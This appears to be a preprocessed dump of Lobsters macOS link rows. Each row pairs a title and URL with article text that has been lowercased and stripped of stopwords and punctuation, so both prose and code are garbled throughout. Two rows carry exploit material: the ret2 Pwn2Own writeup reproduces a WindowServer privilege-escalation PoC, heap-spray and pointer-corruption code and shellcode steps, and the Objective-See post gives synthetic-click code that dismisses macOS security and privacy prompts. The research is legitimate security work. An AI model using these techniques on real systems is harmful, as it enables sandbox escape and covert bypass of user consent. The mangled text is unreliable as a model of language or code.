unintimidating even amusing note normally application extension txt com however name application contain unicode character leverage homograph attack allows u name malicious application something like attachmenttxt x really carian letter x recent version safari prompt user launching application registered handle custom url request older version safari eg default install el capitan instead version safari show warning blindly attempt launch malicious application regardless safari version one hurdle file quarantine file quarantine responsible popup displayed anytime execute application downloaded internet good news percentage mac user click cancel good news percentage mac user click allow confirm taha noted talk windshift apt successful leveraging attack vector also still control name application perhaps increase likelihood user clicking allow maybe adding emojis note might wondering gatekeeper default configuration gatekeeper allows signed application malware used windshift apt group signed mac malware day gatekeeper nt even come play wrapping made diagram illustrate step custom url scheme handler attack conclusion everyday see apt group targeting mac user even le common malware leverage rather novel infection vector however naive think mac user safe threat windshift apt group clearly illustrated blog post discussed feature macos document handler custom url scheme handler showed actively abused malware luckily attack especially modern version macos require user interaction however proven successful wild looking decently reliable way infect mac user mac user concerned security use google chrome stuck safari least turn automatic unzipping downloaded file registration malicious custom url scheme handler triggered application unzipped turn open safari preference general tab uncheck option open safe file downloading also ca nt hurt set gatekeeper allow apps mac app store selectively carefully allow external application needed love blog post tool support via patreon mahalo
273,Lobsters,mac,Apple macOS,Talospace,https://www.talospace.com/,talospace,took wrap officially today raptor said wo nt system emulating openpower bare metal level writing firmware bootkernel created opbuild open source open firmware great improvement coreboot steady evolution recent system appears fsf respect freedom list talos ii lite indisputably libre fsf ryf certification even though huge,ibm took wrap officially today samsungmanufactured monster layer core thread per core tb memory access opencapi pcie new onboard embedded matrix math accelerator specialized ai performance multipetabyte memory cluster transparent memory encryption four time number aes engine overall ibm touting processor three time energy efficient twice fast scalar four time fast vector operation general availability announced first damn sound sweet talos ii desk thread pcie already giving sorrowful eeyore eye even though guarantee lowerend system suitable workstation available processor right know right raptor said wo nt system stand presently nobody else making workstationclass openpower machine raptor probably reason ndas playing close vest follows merely variably informed personal conjecture may completely inaccurate one truly incredible thing openpower least far see hardware previous article looked emulating openpower bare metal level even writing firmware bootkernel bootloader highlevel firmware really beginning build image created opbuild contains petitboot bootloader skiroot filesystem skiboot containing opal openpower abstraction layer handle pcie interrupt operating system service hostboot initializes train ram buffer bus selfboot engine initializes cpu even fusedin first instruction executes otprom run selfboot engine open source otprom onetime programmable rom everything inspectable changeable executes first instruction baseboard management controller power system open firmware know computer nt trust anyone firmware build nt want always build flash system contrast gyration open system struggle interpret slam vendor like purism best deliver frequently used architecture workstation server unlocked fashion possible processor manufacturer going exactly opposite direction great improvement untangling tendril intel management engine processor primarily coreboot steady evolution even improvement significant portion intel disabled secret sauce still needed bring cpu trust sauce specifically say addition partition activated still fully understood situation even worse amd ryzen processor platform security processor least variant nt presently supported coreboot though apparently working port nt take word writing recent system appears fsf respect freedom list talos ii lite imagine blackbird soon follow viking indisputably libre fsf ryf certification amd opteron eight nine year old stand believe powerful system still available fsf ryf list production opteron think reasonable argument open something need considered libre point could considered meaningful control machine denying aspect modern machine prohibited policy getting mean putting faith processor vendor may truly deserve nt get started gpus either matter arm raptor wo nt say public disenchantment suggests aspect processor firmware stack open situation better hoping merely oversight ibm part future policy effective openpower need open isa royaltyfree even though huge sure think room processor manufacturer distinguish market run risk race bottom people simply rip design think real concern riscv think sharing reference design necessary get system bootstrapped ca nt deny money high performance application high performance microarchitecture demand return investment justify development cost similarly extent packin hardware like nest accelerator nt part open isa separately managed device simply share die seems logical also make part processor manufacturer stand potential customer firmware absolutely need clean available isa isa open instruction cpu running part open standard firmware component ought entirely consist instruction must open cpu packin hardware die nt part open isa able bring chip without standard set current openpower standard nt really deserve openpower name worried raptor insinuation imply ibm standard nt similarly arguing currently incomplete situation functionally equivalent openpower matter riscv may wellintentioned disingenuous fsf may ideologue binary blob nt make position wrong entire openpower ecosystem ibm recognize much goodwill prominence openness generated community hope wrong concerned let make sure get right wo nt practicing preach going kill u crib
274,Lobsters,mac,Apple macOS,Exploiting the macOS WindowServer for root,https://blog.ret2.io/2018/08/28/pwn2own-2018-sandbox-escape/,exploiting macos windowserver root,proofofconcept previous post attributed compromised replaying bitflips vulnerability constraint first property second property third property corruption methodology hoard allocator dbi guided exploitation fuzzer gist find object allocation started pointer tagged pointer phrack keen tagged pointer always hotkey object plan action leaking heap layout hotkey feng shui array feng shui cfstringref corruption code execution phrack continuation execution exploit stats vulnerability javascriptcore exploit research binary ninja published elvanderb talk conclusion,sixth final post series document long twisted road weaponizing exploit macos windowserver serving memorycorruption based privilege escalation root used zeroday escape safari sandbox macos first describe constraint discovered vulnerability cover tool technique used discover interesting corruption target compatible vulnerability followed detailed walkthrough exploit developed finally publish source complete exploit end post offering challenge reward community build better exploit demonstrating standalone macos windowserver privilege escalation root proofofconcept previous post inprocess windowserver fuzzer discovered bug speculated could lead exploitable outofbounds oob write root cause vulnerability attributed classic signedunsigned comparison issue function cgxregisterforkey mach message handler macos windowserver better study crash otherwise abnormal program behavior first step always build reliable minimized proofofconcept poc code provided constitutes minimal standalone poc built demonstrate discovered vulnerability proofofconcept system inc compiled clang framework foundation framework cocoa pocm poc import dlfcnh import cocoacocoah int cgsnewconnection int int int slpsregisterforkeyonconnection int void unsigned int bool void resolvesymbols void handlecoregraphics dlopen systemlibraryframeworkscoregraphicsframeworkcoregraphics rtldglobal rtldnow void handleskylight dlopen systemlibraryprivateframeworksskylightframeworkskylight rtldglobal rtldnow cgsnewconnection dlsym handlecoregraphics cgsnewconnection slpsregisterforkeyonconnection dlsym handleskylight slpsregisterforkeyonconnection dlclose handlecoregraphics dlclose handleskylight int main int cid result printf resolving symbol n resolvesymbols printf registering windowserver n nsapplicationload result cgsnewconnection cid result printf windowserver yet initialized n return processserialnumber psn psnhighlongofpsn psnlowlongofpsn getpid printf triggering bug n bug result slpsregisterforkeyonconnection cid psn bug return besides minor bootstrapping necessary communicate windowserver poc simple calling slpsregisterforkeyonconnection function exported skylight private framework maliciously crafted parameter named bug slpsregisterforkeyonconnection called user process machmsg sent mach ipc windowserver message acted upon buggy handler xregisterforkey api call freely sandboxed compromised instance safari high level depiction mach ipc safari windowserver compiling running poc unprivileged user instantly crash windowserver running outside safari sandbox rootlevel system service markusmacvm poc user clang framework foundation framework cocoa pocm poc markusmacvm poc user poc registering windowserver resolving symbol triggering bug crash produced new poc mirror saw replaying bitflips previous post crashing outofbounds read could lead write right condition process stopped thread queue comapplemainthread stop reason excbadaccess frame skylight cgxregisterforkey skylight cgxregisterforkey mov rax qword ptr rcx test rax rax je xor ecx ecx target windowserver stopped next section discus caveat make windowserver vulnerability difficult exploit vulnerability constraint first glance vulnerability appeared quite nice exploit relatively shallow bug easy trigger provides rough write capability outofbounds index full control specify malicious index really control data written write unknown value ecx occur attacker controlled outofbounds index taking closer look codepath perform write found constrained following property write coarse byte aligned eg index two precondition constraint must met trigger write codepath little control value get written first property byte alignment explained fact attacker controlled index normally used index array six unknown structure size byte much issue second property proved biggest headache requiring memory around outofbounds index meet certain constraint perform write constraint detailed pseudocode diagram two constraint make triggering outofbounds write nontrivial third property vulnerability much control value written target specifically codepath normally used store heap pointer unknown structure code also store dword directly pointer field happens connectionid cid windowserver due nature constraint discovering interesting compatible corruption target object allocation bug would prove nontrivial corruption methodology first approach survey windowserver sandboxaccessible interface interesting object could allocate massage satisfy constraint required trigger write identified candidate structure mostly failed provide interesting adjacent field corrupt massaging internal state windowserver object meet constraint orange effort misguided focused heavily fulfilling necessary constraint paying little attention would actually get corrupted relatively quickly abandoned strategy favor second approach second strategy built assumption using windowserver heap feng shui would able place interesting allocation directly attacker controlled allocation ending constraint necessary satisfy write codepath aligned adjacent allocation would look something like carefully aligning attacker controlled allocation fulfill write constraint flush victim allocation assuming could locate threshold memory would able target pattern outofbounds write successful triggering bug location would overwrite first four twelve byte presumably victitm allocation object windowserver corrupting first dword adjacent allocation connectionid cid point also learned macos usermode heap implementation based hoard allocator hoardstyle heap heap metadata allocation since windowserver object flush heap crosschunk corruption becomes far interesting dbi guided exploitation accelerate search interesting crosschunk corruption target turned towards using dynamic binary instrumentation dbi solution repurposing part inprocess fuzzer discussed last post wrote new instrumentation script simulate crosschunk corruption random heap allocation first step track windowserver heap allocation using frida based mallocrealloc hooking code existing gist modifying record address size callstack every allocation interceptorattach modulefindexportbyname null malloc onenter function args lock free lock realloc threadsleep lock malloc thismsize args onleave function retval consolelog malloc thismsize hexaddr retval allocation retval thismsize var callstack n threadbacktrace thiscontext backtraceraccurate map debugsymbolfromaddress join n n callstacks retval callstack lock null likewise hooked free drop reference allocation tracking released interceptorattach modulefindexportbyname libsystembdylib free onenter function args lock malloc lock realloc threadsleep lock free thismptr args onleave function retval consolelog free hexaddr thismptr delete allocation thismptr lock null basic heap tracking place last step simulate crosschunk corruption random interval every second instrumentation script would stop survey living allocation aware randomly corrupt first dword small selection said allocation function corruptrandomallocations var address allocation var target ptr address blacklist certain allocation corrupted unusable crash callstacks target undefined continue callstacks target includes dlopen continue callstacks target includes metal continue corrupt allocation mathfloor mathrandom continue save allocation content corruption crash logging corruptedcontents target hexdump target offset length allocation address header true ansi false corruptedcallstacks target callstacks target consolelog corrupting hexaddr address target corrupting first dword random allocation expected windowserver crash new interesting way existing fuzzing harness would log crash along callstacks content allocation corrupted run ideally hoped find object allocation started pointer could partially corrupt point back data control forcing dangling pointer object hopeful would lead new le constrained primitive tagged pointer well known attacker complete control content dangling objectivec object achieve code execution objectivec method call documented phrack exploited keen among others past bizarre unfortunate coincidence discovered simulated corruption fuzzing partial overwrite value windowserver connectionid always bottom two bit set macos bottom two bit every mach port number always set origin bottom two bit appear artifact masking operation xnu mach port creation code discern defined functionality involving bottom two bit mach port set think may actually bug albeit harmless problem within objectivec corefoundation internals bottom bit indicates whether handled real memory pointer dereferenced store object data inline partially corrupting objectivec pointer crosschunk primitive always turned tagged pointer partially overwriting objectivec pointer windowserver connectionid setting bottommost bit fundamentally change inline object operated upon objectivec runtime alone rendered dangling objcmsgsend technique achieving easy codeexecution inaccessible u via simple crosschunk corruption point began recognize precarious vulnerability would exploit way otherwise misalign write forced target noncorefoundation pointer corruption instead hotkey object returning bucketed crash produced simulated corruption discovered windowserver hotkey object candidate allocation target crosschunk corruption macos windowserver appears manage hotkeys registered running application internally windowserver hotkey object maintained linked list first field hotkey structure happens pointer previously created hotkey eg hotkey next lldb hotkey object grooming hotkey allocation directly attacker controlled allocation would able corrupt lower four byte hotkey next pointer connectionid use heap spraying partially corrupted pointer may point attacker controlled data corrupting first dword hotkey object create dangling pointer attacker controlled data importantly skylight expose number apis add remove view manipulate various field hotkey object apis could already see way would able data dangling hotkey flip bit cause damage windowserver heap le constrained manner selection exposed windowserver function act upon hotkey object whiteboarding established thought would viable convoluted path towards achieving code execution time exploit would require multiple heap spray risky crosschunk heap corruption extremely precise bitflip walking tightrope fortune favor bold plan action final sandbox escape exploit broken five distinct phase leak address near base windowserver malloctiny heap using vuln create dangling hotkey careful grooming targeted crosschunk corruption using vuln corrupt cfstringref pointer using dangling hotkey object employ objcmsgsend technique hijack control flow achieve arbitrary code execution cleanup continuation execution remainder post detail phase outlined leaking heap layout first major phase sandbox escape solely responsible leaking information layout windowserver heap strictly necessary using leaked heap pointer provided situational awareness improve speed reliability exploit phase start spraying approximately cfstring object malloctiny heap windowserver using cgssetconnectionproperty int start end cfstringref keyname cfstringcreatewithformat null null keyformat sprayid cgssetconnectionproperty gcid gcid keyname corruptorcfs cfrelease keyname printf completed un sprayed string filled almost exclusively null byte exception one dword middle sprayed string fulfilling constraint effectively creates little outofbounds write catch without causing unintended damage lldb force hook catch write starting arbitrarily chosen buggy index exploit attempt trigger bug multiple time slpsregisterforkeyonconnection incrementing buggy index catch onto one write succeeds effectively string sprayed currentindex startingindex result slpsregisterforkeyonconnection gcid psn currentindex printf attempted buggy write un currentindex result nonzero return code mean write occur result continue dumping corrupted allocation lldb confirmed successful triggering vulnerability would write heap connectionid one sprayed connection property lldb force hook catch write unknownptr byte cid byte using cgscopyconnectionproperty api coregraphics able request sprayed connection property string back windowserver searching content string exploit eventually discover corrupted property containing leaked pointer int start end found length request connection property back windowserver cfstringref keyname cfstringcreatewithformat null null keyformat leaksprayid cgscopyconnectionproperty gcid gcid keyname valueptr cfrelease keyname convert received string raw byte cfstringgetbytes valueptr range true keyvalue corruptorsize got cfrelease valueptr check presence leak leak keyvalue leak leaked leak key found time research true purpose pointer noted gave u rough idea end malloctiny heap fresh windowserver instance also noticed malloctiny heap rather deterministically chunk assumption allowed u predict allocation going relative leaked pointer allowing u compute approximate tip sprayed data using vulnerability plus heap spray phase one leak heap pointer knowledge heap layout deterministic growth could move performing nefarious memory corruption vulnerability hotkey feng shui goal phase two exploit partially corrupt windowserver hotkey pointer could point somewhere within heap data could arbitrarily control would require sequence carefully choreographed heap manipulation followed risky stab crosschunk corruption create dangling hotkey pointer phase begin using heap pointer leaked phase one compute ideal spray size phase two spray size computed cover address expect dangling hotkey pointer land within based assumption would allocate corruptable hotkey object half way spray leaked heap pointer helped u predict allocate object phase two like phase one phase two spray mostly null connection property string halfway spray exploit stop inspect heap attempt identify property string allocated directly adjacent critical locate adjacent value allocation eg key string boundary perform crosschunk corruption identified adjacent allocation pair free later pair using cgssetconnectionproperty null value parameter would effectively free specified connection property value allocation windowserver heap void punchhotkeyholes unsigned int hotkeykeys sizet length int length want punch hole string probed hence int holeindex hotkeykeys cfstringref keyname cfstringcreatewithformat null null keyformat hotkeysprayid holeindex cgssetconnectionproperty gcid gcid keyname null cfrelease keyname punching hole first half phase two null string spray freeing carefully chosen null string chunk exploit would immediately begin creating hotkey object hoping fill one hole punched void createhotkeys int cgssethotkey gcid performed correctly heap hotkey object placed directly chosen connection property allocation annotated lldb dump show threshold two allocation ready crosschunk corruption lldb attacker controlled string probe hook crosschunk corruption hook hotkey object performing crosschunk corruption create dangling hotkey pointer exploit complete second half phase two null string spray ensures address predict dangling pointer point corrupted valid heap address phase two spray complete use vulnerability carefully computed index target corruption lldb dump provided buggy write cross end allocation corrupting first dword hotkey object connectionid lldb attacker controlled string probe hook crosschunk corruption hook corrupted hotkey object crosschunk corruption changed hotkey next use partial overwrite forced creation dangling hotkey pointer though long arduous almost done phase two windowserver heap look something like layout windowserver heap end phase two last step locate precisely sprayed null string allocation dangling hotkey overlapped using api cgssethotkeyenabled attempt enable dangling hotkey id api would flip single bit dangling hotkey allocation one sprayed null string lldb hotkey enabled finally make use cgscopyconnectionproperty retrieve individual sprayed property string windowserver eventually exploit would locate string containing single flipped bit identified sprayed allocation dangling hotkey overlap array feng shui third phase equally tedious previous dangling hotkey hand objective allocate something underneath done properly could least corrupt single bit leak information dangling hotkey proved nontrivial number reason dangling hotkey always aligned odd memory address eg next field pointer dangling hotkey must null otherwise valid pointer cgssethotkeyenabled flip bit viewed byte alignment sake brevity found well crafted carefully allocated precisely aligned cfmutablearray filled cfstringref pointer could satisfy constraint overlaid hotkey teasing path towards hijacking code execution overlaid properly respective allocation would appear memory lldb cfmutablearray lldb dangling hotkey noting separate memory dump depict range address provided additional visual representation help explain unique alignment overlaid byte level representation overlaid allocation respective field interest effectively overlaid hotkey next field dangling hotkey two null field cfmutablearray header also crafted array cfstringref entry underneath single bit toggle via cgssethotkeyenabled precise alignment allow u corrupt cfstringref member pointer within cfmutablearray cfstringref corruption corrupting overlaid cfstringref pointer first identify id dangling hotkey need hotkey id make use coregraphicsskylight apis dangling hotkey id changed away id hotkey id overlaid part array content solution bruteforce hotkey id field bf overlap bottom byte cfstringref pointer within array structure used cgsgethotkey api bruteforce dangling hotkey id return successful result code bfhotkeyid result cgsgethotkey gcid bfhotkeyid result printf found overlaid hotkey id llxn bfhotkeyid hotkeyid bfhotkeyid break conveniently api also return hotkey field various integer data underneath dangling hotkey stitching together could actually reconstruct cfstringref pointer allocated malloclarge heap overlaid cfmutablearray use leak determine whether flip bit string pointer one way another bigheapleak example found reconstructed pointer since bit already set must disable dangling hotkey corrupt pointer corruption change cfstringref pointer bool corruptcfptr hotkeyid bigheapleak flip single bit cfstringref pointer laid beneath dangling hotkey bool flip bigheapleak printf corrupting p pn void bigheapleak void bigheapleak return cgssethotkeyenabled gcid hotkeyid flip finally corrupted objectivec pointer code execution process grooming cfmutablearray dangling hotkey phase three simultaneously spraying huge string object malloclarge heap large string pointed cfstringref member contained final rop chain fake objectivec flipping single high bit cfstringref pointer phase three corrupted pointer misaligned point fake objectivec string structure sprayed final depiction exploit multiple spray chaining corruption simply freed corrupted cfstringref freeing parent cfmutablearray exploit hijack control flow using objcmsgsend technique outlined phrack achieved arbitrary rop bespoke cop gadget followed relatively normal rop jop rop chain proceeds map page rwx shellcode jumping leading arbitrary code execution windowserver system service thus escaping safari sandbox continuation execution often omitted type writeups final phase exploit ensured continuation execution exploited service since windowserver core system service responsible drawing user desktop imperative exploit crash service providing root shell use shellcode carefully clean damage caused windowserver process course exploit effort phase minimal simply neutering pointer property dictionary hotkey chain effort minimize effect collateral damage caused allocation compiled nasm shellcodeasm bit start add rsp mov rax mov save address shellcode repairobjc mov rbx sub rbx sub byte rbx repairws mov rdi connectionid call call cgxconnectionforconnectionid xor mov nuke hotkey pointer mov nuke property dictionary resumews lea rbx ptr getdefaultconnectiontlskeykey mov rbx rbx xorps jmp jmp slxserver pseudo data section shellcode pointer connectionid cgxconnectionforconnectionid getdefaultconnectiontlskeykey slxserver loop selrelease removed root reference malformed allocation shellcode attempt return hijacked control flow back main mach message processing loop bottom slxserver routine infinite loop root windowserver mach message handling thread proved enough reliably restore windowserver stable state achieving continuation execution leaving victim nonethewiser exploit landed system exploit stats vulnerability used exploit discovered february like javascriptcore exploit vulnerability also took approximately manhours study weaponize stabilize discovery testing leading measured success rate fullchain approximately across run inch macbook pro automatically rebooted attempt screenshot simple test harness put together throw log monitor success exploit chain sandbox escape le ideal bulk exploit failure could attributed issue grooming windowserver heap average fullchain safarisandbox took upwards second run spent massaging windowserver heap sandbox escape lovingly named eternal groom research deeper understanding windowserver internals macos heap reasonably confident vulnerability exploited higher reliability significantly lower exploit complexity functional approach detailed post best satisfy lasting itch curiosity eagerly want see somebody better award single binary ninja commercial license msrp first researcher publishes exploit meet following criterion exploit windowserver macos using achieves windowserver code execution le second crash windowserver succeeds greater reliability provide better educational resource community require release blogpost revised exploit publish code claim prize term challenge expire january upon first successful redemption please contact u prior publication concern published exploit code github promote research edit contest succesfully completed elvanderb documented talk offensivecon conclusion course blog series referenced countless public resource studied numerous open source technology employed evaluate zeroday premiere software target exploit built grit persistence making impossible end meet secret hardwork
275,Lobsters,mac,Apple macOS,OSHUG Event #69 - Members' Lightning Talks,http://oshug.org/event/69,oshug event member lightning talk,british computer society open source specialist group hammerspoon staggeringly powerful macos desktop automation hammerspoon chris jones cooking touch science dash engineering chris swan building open source electric surfboard http githubcomlargeostrichopenelectricsurfboard http githubcomlargeostrichopenwaterjet peter bennett jumbo servo position control andy clark next generation storage interface dr kunkel upspin personal storage sharing system upspin sevan janiyan venture plan c compiler riscv dr richard miller note please aim arrive event start prompt,nt usually september meeting thought would interesting hear member project working year delighted welcome range speaker spend minute discussing project joint meeting british computer society open source specialist group hammerspoon staggeringly powerful macos desktop automation hammerspoon expose many part macos simple scripting language lua goal make powerful flexible tool serious power user automate customise many thing possible talk look history automation apple computer hammerspoon work excellent thing help course open source also jump help make even better chris jones creating using advocating open source software since spent last year professional life working onwith open source first half canonical creator ubuntu since working openstack hp red hat year zealously running linux desktopslaptops spent last year recovering macos user nevertheless retained passion contributing open source cooking touch science dash engineering sou vide vacuum technique place food temperature controlled water bath vacuum bit nt important squeezing air zip lock bag generally sufficient precise temperature control essential ensure right protein denatured thermostat typical piece kitchen equipment nowhere near good enough add sensor immersible temperature gauge actuator remote control socket control software dev board run ability cook perfect steak egg fish whatever chris swan tinkering electronics since small child got software realised necessary make hardware interesting thing day job cto global delivery dxc technology bringing large service company customer world devops infrastructure code evening weekend often found making sort project around dev board particular fondness raspberry pi building open source electric surfboard increasing availability printer wide variety component available internet hard build electric surfboard talk cover design construction opensource electric surfboard concept hitting sea including challenge met along way especially managing lot electricity close lot water project found github http githubcomlargeostrichopenelectricsurfboard http githubcomlargeostrichopenwaterjet peter bennett currently studying mining engineering camborne school mine university exeter long standing interest open source technology particularly printing electronics previously reimagined peripheral edsac using printing arduino chiphack wuthering byte jumbo servo position control andy needed really big servo rather spend fortune industrial monster decided make one would used raspberry pi microcontroller decided would digitally controlled rather usual analogue pwm andy clark making repairing shed bottom garden last year code design often quirky enchanting project found github documented workshopshed blog next generation storage interface efficient convenient robust execution datadriven workflow enhanced data management key productive computeraided rd e still storage stack based lowlevel posix io object cloud storage talk introduces chance establishing open communitydriven nextgeneration storage interface similar fashion existing forum forum would bring together vendor storage expert user discus key feature api establish governance strategy envisioned coarsegrained api aim overcome current obstacle highly parallel workflow would beneficial also domain big data even desktop pc bear opportunity create new ecosystem dr kunkel lecturer computer science department university reading previously worked postdoc research department german climate computing center dkrz partner scientific computing group hamburg manages several research project revolving around highperformance computing particularly highperformance storage julian became interested topic hpc storage study computer science besides main goal provide efficient performanceportable io hpcrelated interest data reduction technique performance analysis parallel application parallel io management cluster system costefficiency consideration software engineering scientific software upspin personal storage sharing system upspin try address shortcoming sharing privacy availability data internet modern day whether making state available across multiple computer sharing party upspin personal namespace accomodate built upon sevan janiyan founder venture provides system administration consultancy service fan operating system computer different cpu architecture spare time maintains build open source software variety system featuring powerpc sparc arm cpu plan c compiler riscv plan operating system developed bell lab using new c compiler written ken thompson also later used implement kernel inferno operating system bootstrap early release go language like plan compiler highly portable elegantly minimalist lightweight quick arm version example line code compiles second raspberry pi talk describe exercise retargeting plan c compiler generate code riscv open instruction set architecture dr richard miller learned c retargeting rehosting dennis ritchie original unix c compiler interdata since retargeted unix plan c compiler various cpu n nios ii note please aim arrive event start prompt
276,Lobsters,mac,Apple macOS,A little bit of the one-time MacOS version still lingers in ZFS,https://utcc.utoronto.ca/~cks/space/blog/solaris/ZFSDTypeAndMacOS,little bit onetime macos version still lingers zfs,apple came close releasing zfs part macos zfsvnopsc zfs maintains file type information directory macos among unix support commit announcement,upon time apple came close releasing zfs part macos apple work copy zfs source base far know people sun knew turn even today one little lingering sign hopedfor perhaps preparedfor zfs port zfs source code well sort quite code lurking function read zfs directory turn zfs directory entry filesystem independent format kernel want following comment objnum zfsdirentobj zapzafirstinteger macos x extract object type type zfsdirenttype zapzafirstinteger specifically zfsreaddir zfsvnopsc zfs maintains file type information directory information ca nt used solaris thus illumos overall kernel nt filesystem independent directory entry format could macos darwin macos among unix support dtype comment date way back commit includes change reserve bit directory entry file type created whole setup nt know file type support added specifically help apple macos x port zfs certainly possible seems likely port least mind zfs developer interesting understandable freebsd nt seem influenced way least far comment source code go file type support equally useful freebsd freebsd zfs port date per announcement regardless exact reason zfs picked maintaining file type information directory entry quite useful people freebsd linux file type information useful number thing zfs filesystems provide information unix help make zfs feel like truly first class filesystem one support expected general system feature
277,Lobsters,mac,Apple macOS,Overview of unpatched exploits in macOS,https://objective-see.com/blog/blog_0x36.html,overview unpatched exploit macos,background history synthetic attack offensive malware analysis dissecting osxfruitflyb via custom c c server osxdevilrobber noarfromspace jtool defense synthetic event bypassing apple protection documented feature sniffmk defcon talk invisibility conclusion,synthetic reality breaking macos one click time love blog post support tool writing patreon background imagine attacker piece malware successfully gained access mac hooray probably want thing like dump user keychain determine system geo location enumerate user contact load kernel extension kext bypass security product unfortunately attacker recent version macos handful new security mechanism prevent action security mechanism generate alert response action alert design user interact example approve action however find way programmatically synthetically interact alert generically bypass security mechanism one fell swoop say attack exists ui becomes single point failure blog post delf many aspect synthetically event macos malware abusing feature new attack remain unpatched note blog post mirror recent defcon talk mouse mightier sword though post include new technical detail full slide talk viewed history synthetic attack idea synthetically programmatically interacting ui nefarious purpose novel idea let look malware ab us event note attack described section thwarted read blocked recent version macos later post however disclose work even latest released version apple o osxfruitfly written decade ago yet discovered early previously wrote lengthy white paper malware offensive malware analysis dissecting osxfruitflyb via custom c c server noted ability generate synthetic mouse keyboard event neat gif illustrating remote attacker could remotely dismiss keychain security access prompt via osxfruitfly another piece mac malware leveraged synthetic event osxdevilrobber noted talented noarfromspace dumped user keychain bypassing keychain access prompt via simple applescript command adware also known make use synthetic event example osxgenieo installs browser extension however order accomplish osxgenieo must bypass security prompt attempt prevent programmatic installation safari browser extension adware bypass alert simply sending synthetic mouse event click allow specifically dumping osxgenieo method via jtool see class named safariextensioninstaller jtool objc v installerappcontentsmacosappas interface safariextensioninstaller getpopupposition clickoninstallbutton clickonallowbuttonkeychain clickontrustbutton wonder clickoninstallbutton button char safariextensioninstaller clickoninstallbutton selector getpopupposition cgeventcreatemouseevent rcx cgeventcreatemouseevent rcx rbx cgeventcreatemouseevent rcx cgeventpost cgeventpost cgeventpost rbx first get location alert popup via call method aptly named getpopupposition sends synthetic mouse event via cgeventcreatemouseevent cgeventpost apis mouse move event correspond left click end result adware able dismiss alert install malicious browser extension defense synthetic event recent version macos apple implemented various defense thwart synthetic attack however defense generic instead protect certain ui component certain security access prompt high sierra possibly older version macos one try send programmatic mouse event example keychain access prompt o detect block log showtccd pid checking access target pid tccd service ktccserviceaccessibility allow prompting returning preflightunknownexecution error system event got error osascript allowed assistive access specifically macos check process generating synthetic event afforded assistive access yes assistive access prompt also protected attack note assistive access must manually given application via system preference application view application given right one dump sipprotected o privacy database libraryapplication supportcomappletcctccdb synthetic event generated via coregraphics apis also filtered blocked target ui component explicitly protected seen following system log output default tccd pid checking access target pid error windowserver sender prohibited synthesizing event grep sender prohibited synthesizing event string find postfilteredeventtapdata function core libraryint postfilteredeventtapdata int int int cgxsendercansynthesizeevents oslogtypeenabled defaultlog rbx defaultlog oslogerrorimpl sender prohibited synthesizing event int cgxsendercansynthesizeevents rax sandboxcheckbyaudittoken hidcontrol rdx rdx see decompilation error message logged cgxsendercansynthesizeevents function return falseno occur sandboxcheckbyaudittoken method fails name suggestion sandboxcheckbyaudittoken function check process sending synthetic event hidcontrol entitlement check appears performed kernel mpoiokitcheckhidcontrolt function bypassing apple protection ok let hacker hat black white gray discus vulnerability goal simple synthetically interact anyall ui prompt security privacy access etc fully patched high sierra box thing normal user like dump keychain approve kernel extension load spelunking around came across feature named mouse key mouse key documented feature macos apple note allows use keyboard mouse hen mouse key enabled example move mouse right one simply press numberpad keyboard generate mouse click press numberpad begets question mouse key enabled programmatically synthetic keyboard event generate trusted read allowed synthetic mouse event answer question yes first use applescript programmatically open pane system preference application checkbox enabling mouse key use coregraphics send synthetic mouse check enable enable mouse keysvoid enablemk float x float apple script nsapplescript scriptobject nsapplescript alloc initwithsource tell application system preference n activaten reveal anchor mouse pane id comapplepreferenceuniversalaccess n end tell exec scriptobject executeandreturnerror nil let finish sleep clicky clicky cgpostmouseevent cgpointmake x true true cgpostmouseevent cgpointmake x true false return apple protects certain ui component security alert synthetic event ui component protected good go generate programmatic mouse click mouse key enabled first move mouse send synthetic keyboard event via applescript specifically synthesize key click via mouse keyvoid clickallow float x float move mouse cgeventpost kcghideventtap cgeventcreatemouseevent nil kcgeventmousemoved cgpointmake x kcgmousebuttonleft apple script nsapplescript script nsapplescript alloc initwithsource tell application system event key code exec script executeandreturnerror nil mouse key enabled keycode map numberpad pressed even programmatically system convert mouse click observed using opensource mouse keyboard sniffer sniffmk sniffmkevent key downkeycode key upkeycode left mouse x event left mouse x since o conversion keyboard mouse event passing mouse event click even protected ui component accept process event generally speaking protected component trust synthetic event source o capability lot thing like dumping exfiltrating user keychain private key unencrypted password responsibly reported bug apple patched high sierra supplemental update ala synthetic issue still abound first noticed various privacyrelated alert even fullypatched macos box blindingly accepted programmatic mouse eventsfor example recent version macos macos display alert code try access system user geolocation user contact user calendar event since alert accept synthetic event malware could simply dismiss programmatically given point x generate synthetic event cgpostmouseevent point true true cgpostmouseevent point true false proof concept attack able ascertain user geolocation synthetically dismissing o access alert may wondering apple even present alert malware trivially bypass maybe provide answer loss ok turn even worse issue issue allows unprivileged malware attacker interact protected ui component high sierra user assisted kernel loading interface yes also work fully patched macos system opps finding bug embarrassing accident trying test apple patch cut paste code incorrectly result lovely recall one send synthetic mouse event via coregraphics framework normally mouse click send two event mouse event followed mouse event given point x generate synthetic event final param true mouse downcgpostmouseevent point true true final param false mouse upcgpostmouseevent point true false however one copy paste first line cgpostmouseevent point true true forgets change final parameter true false indicate mouse generate two mouse event theory probably ignored however turn case instead via sniffmk observe system convert second invalid mouse mouse sniffmkevent left mouse downevent source pid state synthetic x event left mouse upevent source pid state synthetic x issue nt much second mouse event converted mouse event done o give mean source process id event ie ossystem noted generally speaking ui including security prompt protected component allow synthetic event system pid example sending typical mouse downup event allow button user assisted kernel loading interface ignored following error log stream grep mousedropping mouse event sender pid nt self pid noted allowed hooray programmatically approve loading kernel extension even fully patched high sierra system osxmacos one always needed root load extension attack gain u rather question point user assisted kernel loading first place well recent version macos root load kext kext also signed almost impossible get kernel codesigning certificate apple attacker root privilege detailed defcon talk load known vulnerable driver legitimately signed exploit known vulnerability gain arbitrary code execution context kernel apple answer attack user assisted kernel loading add extra layer security requiring user must manually approve loading kext ala shown security mechanism via still broken suffers yups developer unlike bad guy forced play apple rule invisibility one obvious downside attack utilize synthetic event visible imagine sitting desk working mac sudden alert pop mouse seemingly accord move alert click dismiss clearly know hacked luckily attackermalware simple solution dim screen whilst screen brightness dimmed ui still fully present active v display locked screensaver however appear user thus synthetic attack invisible want make sure attacker dim screen opportune time example certain amount user inactivity note use cgeventsourcesecondssincelasteventtype api display going sleep latter scenario code detect display go sleep via kiomessagecandevicepoweroff notification quickly dim screen brightness level perform synthetic attack display sleep conclusion ab using synthetic event malware local attacker bypass myriad macos builtin security mechanism although apple aware attack vector attempted protect security privacy related ui component o quite simply failed even fully patched high sierra system trivially possible synthetically interact thus dismiss ui component invisibly good news well u mac user macos mojave synthetic event globally ignored o unless user explicitly give 